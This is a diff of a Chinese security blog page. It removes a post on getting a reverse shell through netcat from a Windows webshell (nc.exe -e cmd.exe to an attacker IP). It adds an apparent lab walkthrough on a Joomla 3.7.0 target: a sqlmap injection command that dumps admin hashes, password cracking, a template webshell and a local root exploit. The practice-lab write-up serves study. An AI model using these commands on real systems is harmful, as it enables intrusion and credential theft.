@@ -4,16 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="nc提权, 璃人">
-    <meta name="description" content="NC提权kali(攻击机)ip：172.17.4.224
-windows(靶机)ip：172.17.3.88
-上传1.bat(cmd)跟nc.exe
-
-kali使用nc命令在任意端口监听
-nc -vv -l -p 52
-
-
-在webshel">
+    <meta name="keywords" content="Web 应用安全, 璃人">
+    <meta name="description" content="Web应用安全信息收集nmap扫一下，发现有21、22、80端口
+┌──(root💀kali)-[~]
+└─# nmap -sV 192.168.1.114 -O
+Starting Nmap 7.91 ( https://nmap.org">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -27,7 +22,7 @@ nc -vv -l -p 52
 
     
 
-    <title>nc提权 | 璃人</title>
+    <title>Web 应用安全 | 璃人</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -258,12 +253,12 @@ nc -vv -l -p 52
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">nc提权</h1>
+                    <h1 class="description center-align post-title">Web 应用安全</h1>
                 </div>
             </div>
         </div>
@@ -379,16 +374,16 @@ nc -vv -l -p 52
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%8F%90%E6%9D%83/">
-                                <span class="chip bg-color">提权</span>
+                            <a href="/tags/linux/">
+                                <span class="chip bg-color">linux</span>
                             </a>
                         
-                            <a href="/tags/windows/">
-                                <span class="chip bg-color">windows</span>
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
                             </a>
                         
-                            <a href="/tags/nc/">
-                                <span class="chip bg-color">nc</span>
+                            <a href="/tags/web%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">web渗透</span>
                             </a>
                         
                     </div>
@@ -399,8 +394,8 @@ nc -vv -l -p 52
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%8F%90%E6%9D%83/" class="post-category">
-                                提权
+                            <a href="/categories/Web%E6%B8%97%E9%80%8F/" class="post-category">
+                                Web渗透
                             </a>
                         
                     </div>
@@ -412,7 +407,7 @@ nc -vv -l -p 52
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-06-21
+                    2022-09-22
                 </div>
                 
 
@@ -426,14 +421,14 @@ nc -vv -l -p 52
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    149
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -453,25 +448,272 @@ nc -vv -l -p 52
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="NC提权"><a href="#NC提权" class="headerlink" title="NC提权"></a><center>NC提权</center></h1><p>kali(攻击机)ip：172.17.4.224</p>
-<p>windows(靶机)ip：172.17.3.88</p>
-<p>上传1.bat(cmd)跟nc.exe</p>
-<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/06/21/fc34eb6188d1d26f.png"></p>
-<p>kali使用nc命令在任意端口监听</p>
-<pre><code>nc -vv -l -p 52
+                <h1 id="Web应用安全"><a href="#Web应用安全" class="headerlink" title="Web应用安全"></a><center>Web应用安全</center></h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫一下，发现有21、22、80端口</p>
+<pre><code>┌──(root💀kali)-[~]
+└─# nmap -sV 192.168.1.114 -O
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-22 07:50 CST
+Nmap scan report for 192.168.1.114
+Host is up (0.0010s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 52:54:00:41:A5:B7 (QEMU virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
 </code></pre>
-<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/06/21/b9f85911d5820f68.png"></p>
-<p>在webshell中执行以下命令(其中一个即可)</p>
-<p>[nc.exe绝对路径] -e [靶机cmd绝对路径] [kali机ip] [监听端口]</p>
-<p>[[nc.exe绝对路径] -e [1.bat绝对路径] [kali机ip] [监听端口]</p>
-<pre><code>D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e C:\windows\system32\cmd.exe 172.17.4.224 52
-D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/WWW/hackable/uploads/1.bat 172.17.4.224 52
+<p>进入网站发现Web框架是Joomla</p>
+<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/09/22/aaae7c63cb3f96da.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><table>
+<thead>
+<tr>
+<th><strong>前面nmap扫出了FTP服务，匿名登录一下试试</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>登录成功 返现有一个文件夹，里面有个压缩包和一个C文件 先使用GET命令下载下来</strong></td>
+</tr>
+<tr>
+<td></td>
+</tr>
+</tbody></table>
+<pre><code>┌──(root💀kali)-[~/liren]
+└─# ftp 192.168.1.114
+Connected to 192.168.1.114.
+220 (vsFTPd 3.0.3)
+Name (192.168.1.114:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 May 02  2021 uploadFile
+226 Directory send OK.
+ftp&gt; cd uploadFile
+250 Directory successfully changed.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0           91324 May 02  2021 joomscan-master.zip
+-rw-r--r--    1 0        0            5776 May 02  2021 upstream44.c
+226 Directory send OK.
 </code></pre>
-<p><img src="/medias/gif/meiyou.gif" data-original="https://uploader.shimo.im/f/KIiOQWBDcOnjFgMd.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjM4MzE4NDYsImZpbGVHVUlEIjoiZTFBejRwMXJnWGNNMFBxVyIsImlhdCI6MTY2MzgzMTU0NiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo3MDk2MDMxM30.__gHx_hziw_jzuW7gzrwt1bw1lF_ciqQ66sb4Fk0Xyw"></p>
-<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/06/21/4ef1f26f89033b08.png"></p>
-<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/06/21/4ef1f26f89033b08.png"></p>
-<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/06/21/5501c64742e3eef7.png" alt="反弹成功"></p>
-<p>shell里输入，chcp 65001解决乱码</p>
+<p>解压 发现是专门扫描Joomla的</p>
+<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/09/22/4b52c3a9b2e79b15.png"></p>
+<p>用这个扫描一下Web站点</p>
+<pre><code>┌──(root💀kali)-[~/liren/joomscan-master]
+└─# perl joomscan.pl -u http://192.168.1.114/
+    ____  _____  _____  __  __  ___   ___    __    _  _ 
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+                        (1337.today)
+   
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://192.168.1.114/ ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable                                     
+                                                                              
+[+] Checking Directory Listing                                                
+[++] directory has directory listing :                                        
+http://192.168.1.114/administrator/components                                 
+http://192.168.1.114/administrator/modules                                    
+http://192.168.1.114/administrator/templates                                  
+http://192.168.1.114/images/banners                                           
+                                                                              
+                                                                              
+[+] Checking apache info/status files                                         
+[++] Readable info/status files are not found                                 
+                                                                              
+[+] admin finder                                                              
+[++] Admin page : http://192.168.1.114/administrator/                         
+                                                                              
+[+] Checking robots.txt existing                                              
+[++] robots.txt is found                                                      
+path : http://192.168.1.114/robots.txt                                        
+                                                                              
+Interesting path found from robots.txt                                        
+http://192.168.1.114/joomla/administrator/                                    
+http://192.168.1.114/administrator/                                           
+http://192.168.1.114/bin/                                                     
+http://192.168.1.114/cache/                                                   
+http://192.168.1.114/cli/                                                     
+http://192.168.1.114/components/                                              
+http://192.168.1.114/includes/                                                
+http://192.168.1.114/installation/                                            
+http://192.168.1.114/language/                                                
+http://192.168.1.114/layouts/                                                 
+http://192.168.1.114/libraries/                                               
+http://192.168.1.114/logs/                                                    
+http://192.168.1.114/modules/                                                 
+http://192.168.1.114/plugins/                                                 
+http://192.168.1.114/tmp/                                                     
+                                                                              
+                                                                              
+[+] Finding common backup files name                                          
+[++] Backup files are not found                                               
+                                                                              
+[+] Finding common log files name                                             
+[++] error log is not found                                                   
+                                                                              
+[+] Checking sensitive config.php.x file                                      
+[++] Readable config files are not found                                      
+                                                                              
+                                                                              
+Your Report : reports/192.168.1.114/
+</code></pre>
+<p>扫描结果joomla版本为joomla3.7.0</p>
+<h3 id="搜索漏洞利用模块"><a href="#搜索漏洞利用模块" class="headerlink" title="搜索漏洞利用模块"></a>搜索漏洞利用模块</h3><pre><code>┌──(root💀kali)-[~/liren/joomscan-master]
+└─# searchsploit joomla 3.7 
+-------------------------------------------- ---------------------------------
+ Exploit Title                              |  Path
+-------------------------------------------- ---------------------------------
+Joomla! 3.7 - SQL Injection                 | php/remote/44227.php
+Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection  | php/webapps/42033.txt
+Joomla! Component ARI Quiz 3.7.4 - SQL Inje | php/webapps/46769.txt
+Joomla! Component com_realestatemanager 3.7 | php/webapps/38445.txt
+Joomla! Component Easydiscuss &lt; 4.0.21 - Cr | php/webapps/43488.txt
+Joomla! Component J2Store &lt; 3.3.7 - SQL Inj | php/webapps/46467.txt
+Joomla! Component JomEstate PRO 3.7 - &#39;id&#39;  | php/webapps/44117.txt
+Joomla! Component Jtag Members Directory 5. | php/webapps/43913.txt
+Joomla! Component Quiz Deluxe 3.7.4 - SQL I | php/webapps/42589.txt
+-------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>有个 SQL 注入 php&#x2F;webapps&#x2F;42033.txt</p>
+<table>
+<thead>
+<tr>
+<th>find查找一下，把里面的payload复制出来直接爆库</th>
+</tr>
+</thead>
+</table>
+<pre><code>┌──(root💀kali)-[~/liren/joomscan-master]
+└─# find / -name 42033.txt 
+/usr/share/exploitdb/exploits/php/webapps/42033.txt
+                                                                              
+┌──(root💀kali)-[~/liren/joomscan-master]
+└─# cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
+</code></pre>
+<p>sqlmap 进行sql注入 跑出后台密码</p>
+<pre><code>sqlmap -u &quot;http://192.168.1.114/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbms=mysql -D &quot;joomla&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump -p list[fullordering]
+
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$UI/eNzVj3QoFqxq8yVG2p.lc4jBfRJgcRqGGaoHBaq2JvRh4h3//y |
++----------+--------------------------------------------------------------+
+</code></pre>
+<h3 id="后台密码破解"><a href="#后台密码破解" class="headerlink" title="后台密码破解"></a>后台密码破解</h3><pre><code>┌──(root💀kali)-[~]
+└─# cat hash    
+$2y$10$UI/eNzVj3QoFqxq8yVG2p.lc4jBfRJgcRqGGaoHBaq2JvRh4h3//y
+                                                                             
+┌──(root💀kali)-[~]
+└─# john hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+admin            (?)     
+1g 0:00:00:51 DONE 2/3 (2022-09-22 16:55) 0.01926g/s 54.37p/s 54.37c/s 54.37C/s abbott..admin
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<h3 id="登录后台写马"><a href="#登录后台写马" class="headerlink" title="登录后台写马"></a>登录后台写马</h3><table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="http://192.168.1.114/joomla/administrator/">http://192.168.1.114/joomla/administrator/</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>账号:admin 密码:admin</td>
+</tr>
+<tr>
+<td><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/09/22/835b23dc9d60e92e.png"></td>
+</tr>
+</tbody></table>
+<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/09/22/3fcc16fc18f338ca.png"></p>
+<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/09/22/61f3fcfe99accc16.png"></p>
+<table>
+<thead>
+<tr>
+<th>往当前使用的模板写入一句话木马</th>
+</tr>
+</thead>
+</table>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><table>
+<thead>
+<tr>
+<th>连接蚁剑 或 菜刀 webshell</th>
+</tr>
+</thead>
+</table>
+<p><img src="/medias/gif/meiyou.gif" data-original="https://s3.bmp.ovh/imgs/2022/09/22/9d9ab86f62d3c05c.png"></p>
+<p>kali瑞士军刀nc监听2222端口</p>
+<pre><code>┌──(root💀kali)-[~]
+└─# nc -lvp 2222                                                          1 ⨯
+listening on [any] 2222 ...
+</code></pre>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><table>
+<thead>
+<tr>
+<th>之前发现ftp服务器上面的C文件，upstream44.c 是用来提权的</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>把upstream44.c上传上去，然后用gcc编译upstream44.c</td>
+</tr>
+<tr>
+<td>运行upstream44.c，whoami查看当前用户为root，提权成功</td>
+</tr>
+<tr>
+<td></td>
+</tr>
+</tbody></table>
+<pre><code>www-data@deny-KVM:/var/www/html/admin$ ls
+ls
+upstream44.c
+# 编译
+www-data@deny-KVM:/var/www/html/admin$ gcc -o upstream44 upstream44.c
+gcc -o upstream44 upstream44.c
+www-data@deny-KVM:/var/www/html/admin$ ls          
+ls
+upstream44
+upstream44.c
+# 运行
+www-data@deny-KVM:/var/www/html/admin$ ./upstream44
+./upstream44
+whoami
+root
+</code></pre>
+<p>中科磐云</p>
 
                 
             </div>
@@ -498,7 +740,7 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/06/21/nc%E6%8F%90%E6%9D%83/">http://example.com/2022/06/21/nc%E6%8F%90%E6%9D%83/</a>
+                    <a href="http://example.com/2022/09/22/Web-%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8/">http://example.com/2022/09/22/Web-%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -536,16 +778,16 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%8F%90%E6%9D%83/">
-                                    <span class="chip bg-color">提权</span>
+                                <a href="/tags/linux/">
+                                    <span class="chip bg-color">linux</span>
                                 </a>
                             
-                                <a href="/tags/windows/">
-                                    <span class="chip bg-color">windows</span>
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
                                 </a>
                             
-                                <a href="/tags/nc/">
-                                    <span class="chip bg-color">nc</span>
+                                <a href="/tags/web%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">web渗透</span>
                                 </a>
                             
                         </div>
@@ -722,9 +964,10 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/09/22/Web-%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8/">
                     <div class="card-image">
@@ -742,9 +985,9 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -757,6 +1000,7 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -783,13 +1027,13 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/16/%E9%9B%B7net/">
+                <a href="/2022/06/21/nc%E6%8F%90%E6%9D%83/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/gif/meiyou.gif" data-original="/medias/featureimages/22.jpg" class="responsive-img" alt="雷net">
+                        <img src="/medias/gif/meiyou.gif" data-original="/medias/featureimages/8.jpg" class="responsive-img" alt="nc提权">
                         
-                        <span class="card-title">雷net</span>
+                        <span class="card-title">nc提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -800,14 +1044,14 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-06-21
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Steins-Gate/" class="post-category">
-                                    Steins;Gate
+                            <a href="/categories/%E6%8F%90%E6%9D%83/" class="post-category">
+                                    提权
                                 </a>
                             
                             
@@ -817,12 +1061,16 @@ D:/phpStudy/PHPTutorial/WWW/hackable/uploads/nc.exe -e D:/phpStudy/PHPTutorial/W
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%91%BD%E8%BF%90%E7%9F%B3%E4%B9%8B%E9%97%A8/">
-                        <span class="chip bg-color">命运石之门</span>
+                    <a href="/tags/%E6%8F%90%E6%9D%83/">
+                        <span class="chip bg-color">提权</span>
                     </a>
                     
-                    <a href="/tags/%E9%9B%B7net/">
-                        <span class="chip bg-color">雷net</span>
+                    <a href="/tags/windows/">
+                        <span class="chip bg-color">windows</span>
+                    </a>
+                    
+                    <a href="/tags/nc/">
+                        <span class="chip bg-color">nc</span>
                     </a>
                     
                 </div>
